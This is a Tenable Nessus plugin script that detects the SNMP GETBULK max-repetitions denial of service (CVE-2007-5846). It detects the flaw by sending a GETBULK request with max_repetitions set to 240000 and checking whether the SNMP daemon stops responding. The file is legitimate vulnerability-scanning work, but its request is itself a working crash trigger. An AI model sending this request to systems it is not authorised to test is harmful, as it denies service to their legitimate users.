#
#  (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(27841);
  script_version("$Revision: 1.16 $");
  script_cvs_date("$Date: 2016/05/13 15:33:30 $");

  script_cve_id("CVE-2007-5846");
  script_bugtraq_id(26378);
  script_osvdb_id(38904);

  script_name(english:"SNMP GETBULK Large max-repetitions Remote DoS");
  script_summary(english:"Sends a GETBULK request with large value for max-repetitions");
 
  script_set_attribute(attribute:"synopsis", value:
"The remote SNMP daemon is susceptible to a denial of service attack.");
  script_set_attribute(attribute:"description", value:
"It is possible to disable the remote SNMP daemon by sending a GETBULK
request with a large value for 'max-repetitions'.  A remote attacker
may be able to leverage this issue to cause the daemon to consume
excessive memory and CPU on the affected system while it tries
unsuccessfully to process the request, thereby denying service to
legitimate users.");
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?5aef7a73");
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?355da3c5");
  script_set_attribute(attribute:"solution", value:
"Disable the SNMP service on the remote host if you do not use it. 
Otherwise, upgrade to version 5.4.1 or later if using Net-SNMP.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(399);

  script_set_attribute(attribute:"vuln_publication_date", value:"2007/05/04");
  script_set_attribute(attribute:"plugin_publication_date", value:"2007/11/09");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();
 
  script_category(ACT_DENIAL);
  script_family(english:"SNMP");
  script_copyright(english:"This script is Copyright (C) 2007-2016 Tenable Network Security, Inc.");

  script_dependencies("snmp_settings.nasl","find_service2.nasl");
  script_require_keys("SNMP/community");

  exit(0);
}


include("global_settings.inc");
include("snmp_func.inc");
include("misc_func.inc");
include("audit.inc");


community = get_kb_item_or_exit("SNMP/community");


port = get_kb_item("SNMP/port");
if (!port) port = 161;
if (! get_udp_port_state(port)) audit(AUDIT_PORT_CLOSED, port, "UDP");

soc = open_sock_udp(port);
if (!soc) audit(AUDIT_SOCK_FAIL, port, "UDP");


# Make sure a request for sysDesc works.
oid = "1.3.6.1.2.1.1.1.0";
desc = snmp_request(socket:soc, community:community, oid:oid);
if (isnull(desc)) audit(AUDIT_RESP_NOT, port, "an SNMP sysDesc request", "UDP");

# Ignore Microsoft's SNMP service.
#
# nb: these strings are from os_fingerprint_snmp.nasl
if (
  desc =~ "Hardware:.*Software: Windows " ||
  desc == "Microsoft Corp. Windows 98." ||
  desc =~ "^Microsoft Windows CE Version"
) exit (0, "The SNMP server listening on UDP port "+port+" is from Microsoft.");

res = snmp_get_bulk_request(
  socket:soc,
  community:community,
  oid:oid,
  non_repeaters:0,
  max_repetitions:240000
);

if (isnull(res) || report_paranoia > 1)
{
  # There's a problem if our original request no longer works.
  desc = snmp_request(socket:soc, community:community, oid:oid);
  if (isnull(desc))
  {
    security_hole(port:port, protocol:"udp");
    exit(0);
  }
}
audit(AUDIT_LISTEN_NOT_VULN, "SNMP server", port, "(unknown version)", "UDP"); 
